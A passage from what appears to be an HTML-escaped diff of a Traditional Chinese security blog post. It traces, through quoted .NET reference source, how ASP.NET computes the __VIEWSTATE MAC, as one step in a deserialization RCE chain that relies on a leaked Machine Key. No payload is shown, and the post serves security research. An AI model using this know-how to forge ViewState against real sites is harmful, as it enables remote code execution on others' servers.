+&amp;lt;/configuration&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;現在有了 Machine Key 和 RCE Deserialization Gadget，還差最後一個問題，究竟 MAC 是如何產生以及驗證的呢？我上網翻閱了一些公開資料，但沒有找到相關的文章。值得慶幸的是，在很早之前微軟有將 &lt;a href="https://referencesource.microsoft.com/"target="_blank" rel="noopener"&gt;.NET Framework 開源&lt;/a&gt;，所以我們可以很容易去追出實作這塊的程式邏輯。這邊我參考的程式碼是 .NET 4.7.2 的版本。&lt;/p&gt;
+&lt;p&gt;讓我們先從進入點開始，ASP.NET 要將物件進行 Serialize 儲存到 &lt;code&gt;__VIEWSTATE&lt;/code&gt; 之中是依靠函式 &lt;code&gt;ObjectStateFormatter.Serialize(object stateGraph)&lt;/code&gt;。我們可以很明顯看見第 798 行的註解有 &lt;code&gt;EnableViewStateMac&lt;/code&gt; 關鍵字，並且註解下方呼叫的函式會傳入 Serialized Data 的 Binary Buffer 並取得新的 Buffer，所以可以推測實作邏輯應該是在 &lt;code&gt;MachineKeySection.GetEncodedData(buffer, GetMacKeyModifier(), 0, ref length)&lt;/code&gt; 裡面。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;File: ndp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;fx&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;src&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;xsp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;system&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;Web&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;UI&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;ObjectStateFormatter.cs
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;756&lt;/span&gt;: &lt;span style="color:#75715e"&gt;/// &amp;lt;devdoc&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;757&lt;/span&gt;: &lt;span style="color:#75715e"&gt;/// Serializes an object graph into a textual serialized form.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;758&lt;/span&gt;: &lt;span style="color:#75715e"&gt;/// &amp;lt;/devdoc&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;759&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;string&lt;/span&gt; Serialize(&lt;span style="color:#66d9ef"&gt;object&lt;/span&gt; stateGraph) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;760&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// If the developer called Serialize() manually on an ObjectStateFormatter object that was configured&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;761&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// for cryptographic operations, he wouldn&amp;#39;t have been able to specify a Purpose. We&amp;#39;ll just provide&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;762&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// a default value for him.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;763&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; Serialize(stateGraph, Purpose.User_ObjectStateFormatter_Serialize);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;764&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;765&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;766&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;string&lt;/span&gt; Serialize(&lt;span style="color:#66d9ef"&gt;object&lt;/span&gt; stateGraph, Purpose purpose) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;767&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;string&lt;/span&gt; result = &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;768&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;769&lt;/span&gt;: MemoryStream ms = GetMemoryStream();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;770&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;771&lt;/span&gt;: Serialize(ms, stateGraph);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;772&lt;/span&gt;: ms.SetLength(ms.Position);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;773&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;774&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] buffer = ms.GetBuffer();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;775&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; length = (&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt;)ms.Length;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;776&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;777&lt;/span&gt;: &lt;span style="color:#75715e"&gt;#if&lt;/span&gt; !FEATURE_PAL &lt;span style="color:#75715e"&gt;// FEATURE_PAL does not enable cryptography&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;778&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// We only support serialization of encrypted or encoded data through our internal Page constructors&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;779&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;780&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (AspNetCryptoServiceProvider.Instance.IsDefaultProvider &amp;amp;&amp;amp; !_forceLegacyCryptography) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;781&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// If we&amp;#39;re configured to use the new crypto providers, call into them if encryption or signing (or both) is requested.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;782&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;783&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (_page != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt; &amp;amp;&amp;amp; (_page.RequiresViewStateEncryptionInternal || _page.EnableViewStateMac)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;784&lt;/span&gt;: Purpose derivedPurpose = purpose.AppendSpecificPurposes(GetSpecificPurposes());
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;785&lt;/span&gt;: ICryptoService cryptoService = AspNetCryptoServiceProvider.Instance.GetCryptoService(derivedPurpose);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;786&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] protectedData = cryptoService.Protect(ms.ToArray());
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;787&lt;/span&gt;: buffer = protectedData;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;788&lt;/span&gt;: length = protectedData.Length;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;789&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;790&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;791&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;792&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// Otherwise go through legacy crypto mechanisms&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;793&lt;/span&gt;: &lt;span style="color:#75715e"&gt;#pragma&lt;/span&gt; warning disable &lt;span style="color:#ae81ff"&gt;618&lt;/span&gt; &lt;span style="color:#75715e"&gt;// calling obsolete methods&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;794&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (_page != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt; &amp;amp;&amp;amp; _page.RequiresViewStateEncryptionInternal) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;795&lt;/span&gt;: buffer = MachineKeySection.EncryptOrDecryptData(&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;, buffer, GetMacKeyModifier(), &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;796&lt;/span&gt;: length = buffer.Length;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;797&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;798&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// We need to encode if the page has EnableViewStateMac or we got passed in some mac key string&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;799&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; ((_page != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt; &amp;amp;&amp;amp; _page.EnableViewStateMac) || _macKeyBytes != &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;800&lt;/span&gt;: buffer = MachineKeySection.GetEncodedData(buffer, GetMacKeyModifier(), &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;ref&lt;/span&gt; length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;801&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;802&lt;/span&gt;: &lt;span style="color:#75715e"&gt;#pragma&lt;/span&gt; warning restore &lt;span style="color:#ae81ff"&gt;618&lt;/span&gt; &lt;span style="color:#75715e"&gt;// calling obsolete methods&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;803&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;804&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;805&lt;/span&gt;: &lt;span style="color:#75715e"&gt;#endif&lt;/span&gt; &lt;span style="color:#75715e"&gt;// !FEATURE_PAL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;806&lt;/span&gt;: result = Convert.ToBase64String(buffer, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;807&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;808&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;finally&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;809&lt;/span&gt;: ReleaseMemoryStream(ms);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;810&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;811&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; result;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;812&lt;/span&gt;: }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;繼續跟進 &lt;code&gt;MachineKeySection.GetEncodedData(byte[] buf, byte[] modifier, int start, ref int length)&lt;/code&gt;。第 800 行透過 &lt;code&gt;HashData&lt;/code&gt; 函式取得一個 Hash 值，第 803 ~ 815 行則會將這個 Hash 值附加到原本 Buffer 的尾部。但是這邊的 &lt;code&gt;HashData&lt;/code&gt; 需要的參數除了原 buf 以外還多一個 modifier，不過先不用急著找 modifier 定義的位置，讓我們先跟進 &lt;code&gt;MachineKeySection.HashData(byte[] buf, byte[] modifier, int start, int length)&lt;/code&gt;。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;File: ndp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;fx&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;src&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;xsp&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;system&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;Web&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;Configuration&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;MachineKeySection.cs
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;791&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// NOTE: When encoding the data, this method *may* return the same reference to the input &amp;#34;buf&amp;#34; parameter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;792&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// with the hash appended in the end if there&amp;#39;s enough space. The &amp;#34;length&amp;#34; parameter would also be&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;793&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// appropriately adjusted in those cases. This is an optimization to prevent unnecessary copying of&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;794&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// buffers.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;795&lt;/span&gt;: [Obsolete(OBSOLETE_CRYPTO_API_MESSAGE)]
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;796&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;internal&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] GetEncodedData(&lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] buf, &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] modifier, &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; start, &lt;span style="color:#66d9ef"&gt;ref&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; length)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;797&lt;/span&gt;: {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;798&lt;/span&gt;: EnsureConfig();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;799&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;800&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] bHash = HashData(buf, modifier, start, length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;801&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[] returnBuffer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;802&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;803&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (buf.Length - start - length &amp;gt;= bHash.Length)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;804&lt;/span&gt;: {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;805&lt;/span&gt;: &lt;span style="color:#75715e"&gt;// Append hash to end of buffer if there&amp;#39;s space&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;806&lt;/span&gt;: Buffer.BlockCopy(bHash, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, buf, start + length, bHash.Length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;807&lt;/span&gt;: returnBuffer = buf;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;808&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;809&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;810&lt;/span&gt;: {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;811&lt;/span&gt;: returnBuffer = &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;[length + bHash.Length];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;812&lt;/span&gt;: Buffer.BlockCopy(buf, start, returnBuffer, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;813&lt;/span&gt;: Buffer.BlockCopy(bHash, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, returnBuffer, length, bHash.Length);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;814&lt;/span&gt;: start = &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;815&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;816&lt;/span&gt;: length += bHash.Length;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;817&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;818&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (s_config.Validation == MachineKeyValidation.TripleDES || s_config.Validation == MachineKeyValidation.AES) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;819&lt;/span&gt;: returnBuffer = EncryptOrDecryptData(&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;, returnBuffer, modifier, start, length, &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;820&lt;/span&gt;: length = returnBuffer.Length;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;821&lt;/span&gt;: }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;822&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; returnBuffer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ae81ff"&gt;823&lt;/span&gt;: }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;第 857 行判斷如果 config 裡的 Machine Key 設定 Validation 是 MD5，則呼叫 &lt;code&gt;HashDataUsingNonKeyedAlgorithm(null, buf, modifier, start, length, s_validationKey)&lt;/code&gt;，根據先前 SSI 所得到的 web.config，程式應該會進入這一段流程中，繼續跟進 &lt;code&gt;MachineKeySection.HashDataUsingNonKeyedAlgorithm(HashAlgorithm hashAlgo, byte[] buf, byte[] modifier, int start, int length, byte[] validationKey)&lt;/code&gt;。&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
